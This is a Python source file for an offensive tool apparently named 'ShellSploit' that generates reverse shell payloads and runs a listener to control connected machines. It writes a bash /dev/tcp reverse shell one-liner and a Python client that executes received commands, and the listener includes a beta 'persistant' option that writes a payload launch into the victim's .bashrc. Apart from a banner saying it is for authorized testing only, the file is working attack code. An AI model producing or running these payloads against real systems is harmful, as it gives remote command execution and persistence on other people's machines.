import os
import getpass
import socket
from colorama import init, Fore, Back, Style
init(autoreset=True)
legal_warning = Fore.RED + """
************************************************************
* WARNING: This tool is intended for authorized testing    *
* only. Use on systems you own or have explicit permission.*
* Unauthorized use is illegal and may result in criminal   *
* and civil penalties.                                     *
************************************************************
"""

def listen(ip, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip, port))
        server.listen(1)
        print(f"Listening on {ip}:{port}")
    except OSError as e:
        print(f"[!] Failed to start listener: {e}")
        return

    try:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
    except OSError as e:
        print(f"[!] Accept failed: {e}")
        return

    try:
        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                break
            elif command.lower() == "persistant":                         # BETA
                persistant = r""""echo "python payload.py" > .bashrc """  # BETA
                client_socket.send(persistant.encode())                   # BETA

            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Listener closed.")

def option_check(choice):
    if choice == "1":
        shell_type = input("Enter shell type (bash, python): ").lower()
        ip = input("Enter your IP: ")
        port = int(input("Enter port: "))

        if shell_type == "bash":
            with open("payload.sh", "w") as file:
                file.write(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            print("[+] Payload Created")
        elif shell_type == "python":
            with open("payload.py", "w") as file:
                file.write(f"""
import socket
import subprocess

def connect_to_listener():
    server_ip = "{ip}"
    server_port = {port}
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        response = output.stdout + output.stderr
        client_socket.send(response)
        
    client_socket.close()

if __name__ == "__main__":
    connect_to_listener()
    """)
        else:
            print("[!] Unknown shell type.")
            return
        
    elif choice == "2":
        port = int(input("Enter port to listen on: "))
        listen("0.0.0.0", port)
    elif choice in ("exit", "quit"):
        exit()
    else:
        print("[!] Invalid option.")

options_menu = Fore.GREEN + """
Options:
1. Reverse Shell Generator
2. Listener
"""
logo = Fore.MAGENTA + r"""
  ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓  
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░      ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░      ░               ░  ░    ░ ░   ░            

▗▖  ▗▖▄▄▄▄ 
▐▌  ▐▌   █ 
▐▌  ▐▌█▀▀▀ 
 ▝▚▞▘ █▄▄▄ 
"""

username = getpass.getuser()
print(logo)
print("- Made By GdevMan\n- My GH -> https://github.com/GdevMan")
print(legal_warning)
print(options_menu)

def main():
    while True:
        try:
            thing_shell = f"""┌─── {username}\n└ ~ $ """
            choice = input(Fore.GREEN + thing_shell)
            option_check(choice)
        except KeyboardInterrupt:
            print("\n[!] User Quit")
            exit()

if __name__ == "__main__":
    main()
